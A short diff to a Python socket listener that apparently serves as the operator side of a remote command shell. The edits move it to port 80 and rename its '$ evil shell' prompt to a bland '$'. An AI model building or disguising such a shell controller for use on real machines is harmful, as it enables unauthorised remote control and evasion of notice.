@@ -7,7 +7,7 @@ lcoal host translates into 127.0.0.1 which will always be the IP address of the 
 0.0.0.0 ---> "listen on every available network interface"
 '''
 HOST = "0.0.0.0"
-PORT = 12345
+PORT = 80
 BUFFER = 1024
 
 
@@ -22,7 +22,6 @@ def main():
     sock.bind((HOST, PORT))
     sock.listen(5) # number of client connections we can accept
 
-    print("We are here")
    # connect, address = sock.accept()
 
     connect, address = sock.accept()
@@ -31,7 +30,7 @@ def main():
     print(f"Connected by {address}")
     while True:
         # data = connect.recv(BUFFER).decode("UTF-8")
-        command = input("$ evil shell :3 > ")
+        command = input("$")
         if command == "":
             # connect.send("command".encode())
             break
